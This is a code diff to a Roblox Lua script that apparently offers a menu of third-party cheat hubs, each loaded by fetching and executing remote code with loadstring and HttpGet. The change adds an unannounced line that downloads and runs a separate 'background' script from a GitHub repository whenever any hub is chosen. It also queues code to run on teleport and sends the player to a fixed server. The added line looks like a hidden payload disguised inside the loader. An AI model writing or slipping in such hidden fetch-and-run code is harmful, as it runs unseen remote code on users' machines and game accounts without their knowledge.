@@ -37,7 +37,7 @@ local function startMethod3()
         while method3Running do
             detectMenuState()
             wait(0.05)
-        end)
+        end
     end)
 end
 
@@ -146,86 +146,16 @@ layout.Padding = UDim.new(0, 5)
 layout.Parent = scrollFrame
 
 local hubNames = {"NatHub", "Limit Hub", "Lumin Hub", "Thunder Z", "No-Lag", "SpeedHubX"}
-
--- Hub loadstrings mapping
 local hubLoadstrings = {
-    ["NatHub"] = 'loadstring(game:HttpGet("https://get.nathub.xyz/loader"))()',
-    ["Limit Hub"] = 'loadstring(game:HttpGet(("https://raw.githubusercontent.com/FakeModz/LimitHub/refs/heads/main/LimitHub_Luarmor_E.lua")))()',
-    ["Lumin Hub"] = 'loadstring(game:HttpGet("https://lumin-hub.lol/loader.lua",true))()',
-    ["Thunder Z"] = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/ThundarZ/Welcome/refs/heads/main/Main/GaG/Main.lua"))()',
-    ["No-Lag"] = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/Main.lua"))()',
-    ["SpeedHubX"] = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()'
+    'loadstring(game:HttpGet("https://get.nathub.xyz/loader"))()',
+    'loadstring(game:HttpGet(("https://raw.githubusercontent.com/FakeModz/LimitHub/refs/heads/main/LimitHub_Luarmor_E.lua")))()',
+    'loadstring(game:HttpGet("https://lumin-hub.lol/loader.lua",true))()',
+    'loadstring(game:HttpGet("https://raw.githubusercontent.com/ThundarZ/Welcome/refs/heads/main/Main/GaG/Main.lua"))()',
+    'loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/Main.lua"))()',
+    'loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()'
 }
 
-local function createLoadingGUI(hubName)
-    local loadingGui = Instance.new("ScreenGui")
-    loadingGui.Name = "LoadingGUI"
-    loadingGui.ResetOnSpawn = false
-    loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    loadingGui.DisplayOrder = 10000
-    
-    local loadingFrame = Instance.new("Frame")
-    loadingFrame.Name = "LoadingFrame"
-    loadingFrame.Size = UDim2.new(0, 400, 0, 150)
-    loadingFrame.Position = UDim2.new(0.5, -200, 0.5, -75)
-    loadingFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
-    loadingFrame.ClipsDescendants = true
-    
-    local loadingCorner = Instance.new("UICorner")
-    loadingCorner.CornerRadius = UDim.new(0, 12)
-    loadingCorner.Parent = loadingFrame
-    
-    local loadingBorder = Instance.new("UIStroke")
-    loadingBorder.Color = Color3.fromRGB(100, 150, 255)
-    loadingBorder.Thickness = 3
-    loadingBorder.Parent = loadingFrame
-    
-    local loadingTitle = Instance.new("TextLabel")
-    loadingTitle.Name = "LoadingTitle"
-    loadingTitle.Text = "LOADING " .. string.upper(hubName)
-    loadingTitle.Font = Enum.Font.FredokaOne
-    loadingTitle.TextSize = 18
-    loadingTitle.TextColor3 = Color3.fromRGB(200, 220, 255)
-    loadingTitle.BackgroundTransparency = 1
-    loadingTitle.Size = UDim2.new(1, 0, 0, 40)
-    loadingTitle.Position = UDim2.new(0, 0, 0, 20)
-    loadingTitle.TextXAlignment = Enum.TextXAlignment.Center
-    
-    local activatingLabel = Instance.new("TextLabel")
-    activatingLabel.Name = "ActivatingLabel"
-    activatingLabel.Text = "ACTIVATING..."
-    activatingLabel.Font = Enum.Font.GothamBold
-    activatingLabel.TextSize = 16
-    activatingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    activatingLabel.BackgroundTransparency = 1
-    activatingLabel.Size = UDim2.new(1, 0, 0, 30)
-    activatingLabel.Position = UDim2.new(0, 0, 0, 70)
-    activatingLabel.TextXAlignment = Enum.TextXAlignment.Center
-    
-    activatingLabel.Parent = loadingFrame
-    loadingTitle.Parent = loadingFrame
-    loadingFrame.Parent = loadingGui
-    loadingGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-    
-    -- Animate the "ACTIVATING..." text
-    local tweenService = game:GetService("TweenService")
-    local activatingTween = tweenService:Create(
-        activatingLabel,
-        TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
-        {TextTransparency = 0.3}
-    )
-    activatingTween:Play()
-    
-    -- Animate the border
-    local borderTween = tweenService:Create(
-        loadingBorder,
-        TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
-        {Color = Color3.fromRGB(140, 180, 255)}
-    )
-    borderTween:Play()
-end
-
-local function createNotificationGUI(hubName)
+local function createNotificationGUI(hubName, hubIndex)
     local notifGui = Instance.new("ScreenGui")
     notifGui.Name = "NotificationGUI"
     notifGui.ResetOnSpawn = false
@@ -313,86 +243,11 @@ local function createNotificationGUI(hubName)
         
         local player = Players.LocalPlayer
         
-        -- Set queue_on_teleport with the loading GUI and hub's loadstring
-        local loadstringCode = hubLoadstrings[hubName]
-        if loadstringCode then
-            queue_on_teleport([[
-                -- Create loading GUI on teleport
-                local loadingGui = Instance.new("ScreenGui")
-                loadingGui.Name = "LoadingGUI"
-                loadingGui.ResetOnSpawn = false
-                loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-                loadingGui.DisplayOrder = 10000
-                
-                local loadingFrame = Instance.new("Frame")
-                loadingFrame.Name = "LoadingFrame"
-                loadingFrame.Size = UDim2.new(0, 400, 0, 150)
-                loadingFrame.Position = UDim2.new(0.5, -200, 0.5, -75)
-                loadingFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
-                loadingFrame.ClipsDescendants = true
-                
-                local loadingCorner = Instance.new("UICorner")
-                loadingCorner.CornerRadius = UDim.new(0, 12)
-                loadingCorner.Parent = loadingFrame
-                
-                local loadingBorder = Instance.new("UIStroke")
-                loadingBorder.Color = Color3.fromRGB(100, 150, 255)
-                loadingBorder.Thickness = 3
-                loadingBorder.Parent = loadingFrame
-                
-                local loadingTitle = Instance.new("TextLabel")
-                loadingTitle.Name = "LoadingTitle"
-                loadingTitle.Text = "LOADING ]] .. string.upper(hubName) .. [["
-                loadingTitle.Font = Enum.Font.FredokaOne
-                loadingTitle.TextSize = 18
-                loadingTitle.TextColor3 = Color3.fromRGB(200, 220, 255)
-                loadingTitle.BackgroundTransparency = 1
-                loadingTitle.Size = UDim2.new(1, 0, 0, 40)
-                loadingTitle.Position = UDim2.new(0, 0, 0, 20)
-                loadingTitle.TextXAlignment = Enum.TextXAlignment.Center
-                
-                local activatingLabel = Instance.new("TextLabel")
-                activatingLabel.Name = "ActivatingLabel"
-                activatingLabel.Text = "ACTIVATING..."
-                activatingLabel.Font = Enum.Font.GothamBold
-                activatingLabel.TextSize = 16
-                activatingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-                activatingLabel.BackgroundTransparency = 1
-                activatingLabel.Size = UDim2.new(1, 0, 0, 30)
-                activatingLabel.Position = UDim2.new(0, 0, 0, 70)
-                activatingLabel.TextXAlignment = Enum.TextXAlignment.Center
-                
-                activatingLabel.Parent = loadingFrame
-                loadingTitle.Parent = loadingFrame
-                loadingFrame.Parent = loadingGui
-                loadingGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-                
-                -- Animate the "ACTIVATING..." text
-                local tweenService = game:GetService("TweenService")
-                local activatingTween = tweenService:Create(
-                    activatingLabel,
-                    TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
-                    {TextTransparency = 0.3}
-                )
-                activatingTween:Play()
-                
-                -- Animate the border
-                local borderTween = tweenService:Create(
-                    loadingBorder,
-                    TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
-                    {Color = Color3.fromRGB(140, 180, 255)}
-                )
-                borderTween:Play()
-                
-                -- Wait and then execute loadstring
-                task.wait(30)
-                loadingGui:Destroy()
-                ]] .. loadstringCode .. [[
-            ]])
-        end
-        
-        -- Show loading GUI immediately
-        createLoadingGUI(hubName)
+        queue_on_teleport([[
+            ]] .. hubLoadstrings[hubIndex] .. [[
+        ]])
+        task.wait(5)
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/pocarisv/growagarden/refs/heads/main/background/main.lua"))()
         
         local function restartPlayer()
             local jobId = "a82cab16-aac9-43e5-9042-2c47de56f603"
@@ -460,8 +315,7 @@ local function createNotificationGUI(hubName)
     notifGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 end
 
--- Create buttons for each hub
-for i = 1, #hubNames do
+for i = 1, 6 do
     local item = Instance.new("TextButton")
     item.Size = UDim2.new(1, 0, 0, 30)
     item.BackgroundColor3 = Color3.fromRGB(45, 50, 65)
@@ -475,7 +329,7 @@ for i = 1, #hubNames do
     corner.Parent = item
     
     item.MouseButton1Click:Connect(function()
-        createNotificationGUI(hubNames[i])
+        createNotificationGUI(hubNames[i], i)
     end)
     
     item.MouseEnter:Connect(function()
